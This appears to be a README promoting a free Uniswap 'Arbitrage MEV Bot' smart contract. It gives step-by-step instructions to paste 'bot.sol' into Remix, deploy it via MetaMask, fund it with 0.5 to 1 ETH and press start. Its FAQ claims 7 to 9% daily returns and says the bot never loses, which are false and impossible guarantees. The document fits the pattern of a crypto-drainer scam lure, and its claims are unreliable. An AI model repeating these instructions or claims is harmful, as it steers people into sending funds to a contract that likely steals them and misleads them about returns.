# ArbitrageMEVBot


# Easy to Use Arbitrage MEV Bot

Check this short video to see how it works and follow the steps below. 
https://streamable.com/397xwh


Uniswap is a cryptocurrency exchange which uses a decentralized network protocol. If you trade crypto on Uniswap, 1inch or any other decentralized exchange (DEX), then you need to know about front-running bots sniping profits across exchange’s pools.
You are now able to take advantage of those arbitrages yourself, a benefit that was previously only available to highly skilled devs.
Here we provide you the access to user-friendly (no coding skills required) MEV bot so you can enjoy stress-free passive income from day one. It's our flagship project that we recently released which runs on ETH pairs on Uniswap making profits from arbitrage trades.
Using this smart contract source code allows users to create their own MEV bots which stacks up the profits from automatic trades for the users.
We share this Arbitrage MEV bot smart contract for free, but there’s 0.1% fee charged from users’ profits, which goes to us.

How to launch your own arbitrage bot:
1.      Download MetaMask (if you don’t have it already): https://metamask.io/download.html
2,     Access Remix: https://remix.ethereum.org/
3.      Click on the “contracts” folder and then create “New File”. Rename it as you like, i.e: “bot.sol”
Note: If there is a problem if the text is not colored when you create bot.sol and paste the codes from pastebin, try again. If the codes are not colored, you cannot proceed to the next step.
4.      Paste code from bol.sol from the repo codebase in Remix.
5.      Go to the “Solidity Compiler” tab, select version “0.6.6+commit.6c089d02” and then select “Compile bot.sol”.
Make sure “bot.sol” is selected in the CONTRACT section of the SOLIDITY COMPILER section.
6.      Go to the “DEPLOY & RUN TRANSACTIONS” tab, select the “Injected Provider - Metamask” environment and then “Deploy”. By approving the Metamask contract creation fee, you will have created your own contract.
7.      Copy your newly created contract address as shown on video and fund it with any amount of ETH (minimum 0.5-1 ETH recommended) that you would like the bot to earn with by simply sending ETH to your newly created contract address.
8.      After your transaction is confirmed, click the “start” button to run the bot. Withdraw your ETH at any time by clicking the “Withdraw” button.That’s it. The bot will start working immediately earning you profits from arbitrage trades on Uniswap pools.

# FAQ

If many people will use the bot, wouldn’t dilution of profits occur?

We do not plan to limit access to the bot for now because there won’t be any affect for us or our users profiting as pools that the bot works on are with the biggest liquidities and volumes on Uniswap so our users involvement in the pools will always be very minor.


What average ROI can I expect?

According to latest data of bot performances (past 3 weeks) ROI is about +7–9% daily per user. Bot does not make any losses, it only executes trades when there’s proper arbitrage opportunity to make profit, so under all circumstances user is always on plus.


What amount of funds bot need to work?

We recommend funding the contract with at least 0.5-1 ETH to cover gas fees and possible burn fees. Bot targets token contracts with max 10% burn fee and anything lower but nowadays most of tokens comes with 3~6% fees. If you fund the contract with less than recommended and the bot targets another token with high burn fees the contract will basically waste in fees more than make profit.


Does it work on other chains or DEXes as well?

No, currently the bot is dedicated only for Ethereum on Uniswap pools.

